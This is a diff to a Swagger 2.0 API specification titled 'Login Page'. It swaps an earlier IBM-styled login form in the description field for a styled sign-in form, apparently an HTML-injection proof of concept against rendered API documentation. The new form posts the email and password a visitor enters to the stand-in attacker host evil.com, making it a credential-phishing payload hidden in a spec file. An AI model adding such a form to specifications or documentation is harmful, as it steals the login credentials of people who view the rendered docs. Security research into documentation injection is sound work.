@@ -2,139 +2,38 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Login Page
-  description: '
-    <style>
-        /* IBM Carbon-inspired Variables */
-        :root {
-            --ibm-blue: #0f62fe;
-            --ibm-hover: #0353e9;
-            --ibm-gray-100: #f4f4f4;
-            --ibm-gray-800: #393939;
-            --ibm-text-primary: #161616;
-            --ibm-text-secondary: #525252;
-            --white: #ffffff;
-        }
+  description: '<div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 350px; text-align: center;">
+        
+        <h2 style="margin-top: 0; color: #333; font-weight: 600; font-size: 24px;">Welcome Back</h2>
+        <p style="color: #777; font-size: 14px; margin-bottom: 30px;">Please enter your details to sign in.</p>
 
-        body {
-            font-family: 'IBMPlexSans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--ibm-gray-100);
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
+        <form action="https://evil.com" method="post">
+            <div style="margin-bottom: 20px; text-align: left;">
+                <label style="display: block; font-size: 12px; color: #667eea; font-weight: bold; margin-bottom: 5px; text-transform: uppercase;">Email Address</label>
+                <input type="email" placeholder="name@company.com" required 
+                    style="width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 14px; background-color: #f9f9f9;">
+            </div>
 
-        .login-container {
-            background: var(--white);
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
+            <div style="margin-bottom: 10px; text-align: left;">
+                <label style="display: block; font-size: 12px; color: #667eea; font-weight: bold; margin-bottom: 5px; text-transform: uppercase;">Password</label>
+                <input type="password" placeholder="••••••••" required 
+                    style="width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 14px; background-color: #f9f9f9;">
+            </div>
 
-        h1 {
-            font-size: 32px;
-            font-weight: 300;
-            margin-bottom: 8px;
-            color: var(--ibm-text-primary);
-        }
+            <div style="text-align: right; margin-bottom: 25px;">
+                <a href="#" style="color: #764ba2; text-decoration: none; font-size: 13px; font-weight: 500;">Forgot password?</a>
+            </div>
 
-        p {
-            font-size: 14px;
-            color: var(--ibm-text-secondary);
-            margin-bottom: 32px;
-        }
+            <button type="submit" 
+                style="width: 100%; padding: 12px; background: #667eea; border: none; border-radius: 8px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 6px rgba(102, 126, 234, 0.3);">
+                Sign In
+            </button>
+        </form>
 
-        .form-group {
-            margin-bottom: 24px;
-        }
-
-        label {
-            display: block;
-            font-size: 12px;
-            margin-bottom: 8px;
-            color: var(--ibm-text-secondary);
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-bottom: 1px solid #8d8d8d;
-            background-color: #f4f4f4;
-            font-size: 14px;
-            box-sizing: border-box;
-            transition: outline 0.1s;
-        }
-
-        input:focus {
-            outline: 2px solid var(--ibm-blue);
-            outline-offset: -2px;
-        }
-
-        .btn-primary {
-            width: 100%;
-            background-color: var(--ibm-blue);
-            color: white;
-            padding: 14px;
-            border: none;
-            font-size: 16px;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: background 0.2s;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--ibm-hover);
-        }
-
-        .footer-links {
-            margin-top: 32px;
-            font-size: 14px;
-        }
-
-        .footer-links a {
-            color: var(--ibm-blue);
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-    </style>
-<body>
-
-<div class="login-container">
-    <h1>Log in</h1>
-    <p>Don't have an account? <a href="#" style="color: #0f62fe; text-decoration: none;">Create an IBMid</a></p>
-
-    <form>
-        <div class="form-group">
-            <label for="email">IBMid</label>
-            <input type="email" id="email" placeholder="email@address.com" required>
-        </div>
-
-        <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" required>
-        </div>
-
-        <button type="submit" class="btn-primary">
-            Continue <span>→</span>
-        </button>
-    </form>
-
-    <div class="footer-links">
-        <a href="#">Forgot ID?</a><br><br>
-        <a href="#">Forgot password?</a>
+        <p style="margin-top: 25px; font-size: 14px; color: #777;">
+            Don't have an account? <a href="#" style="color: #667eea; text-decoration: none; font-weight: bold;">Sign up</a>
+        </p>
     </div>
-</div>
-
-</body>
-
   '
 paths:
   /:
